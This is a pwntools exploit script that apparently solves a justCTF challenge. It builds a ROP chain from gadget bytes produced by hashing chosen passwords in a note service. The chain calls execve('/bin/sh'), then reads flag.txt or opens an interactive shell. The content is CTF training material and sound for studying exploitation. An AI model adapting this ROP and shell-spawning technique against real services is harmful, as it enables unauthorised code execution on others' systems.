from pwn import *
import time
from random import randint

#context.log_level = 'error'

host = args.HOST or 'localhost'
port = int(args.PORT or 1337)

def solve():
    con = connect(host, port)

    con.readuntil("Operation id:")
    def inc_ptr():
        con.sendline("3")
        con.sendline("DoesNotExist")
        con.readuntil("Operation id:")

    def dec():
        con.sendline("2")
        con.sendline("#")
        con.readuntil("Operation id:")

    def put_hash_of(s):
        con.sendline("1")
        con.readuntil("Give password: ")
        con.sendline(s)
        con.sendline("NoteValue")
        con.sendline("NoteId" + str(randint(0, 10**9)))
        con.readuntil("Operation id:")

        dec()

    def done():
        con.sendline("6")

    def put_valid_string(s):
        con.sendline("2")
        con.sendline(s)
        con.sendline(s + str(randint(0, 10**9)))
        con.readuntil("Operation id:")

    def pop_rdi():
        put_hash_of("58211")
        # 0x5f 0xc3; por rdi; ret;

    def set_al():
        put_hash_of("16333344")
        # 0xb0 0x3b 0xc3; mov al, 0x3b; ret;

    def zero_rdx():
        put_hash_of("2394259329")
        # 0x48 0x31 0xd2 0xc3; xor rdx, rdx; ret;

    def zero_rsi():
        put_hash_of("bf3238765065")
        # 0x48 0x31 0xf6 0xc3; xor rsi; rsi; ret;

    def syscall():
        put_hash_of("bf66659")
        # 0x0f 0x05

    for _ in range(18):
        inc_ptr()

    put_valid_string("xx")

    pop_rdi()
    put_valid_string("/bin/sh")
    set_al()
    zero_rdx()
    zero_rsi()
    syscall()

    # trigger the rop
    done()

    try:
        if args.INTERACTIVE:
            con.interactive()
        con.sendline('cat flag.txt')
        return con.readline()[1:]
    except:
        pass
    con.close()

print('Launching solver...')
flag = solve()
if 'justCTF{' in flag:
    print flag
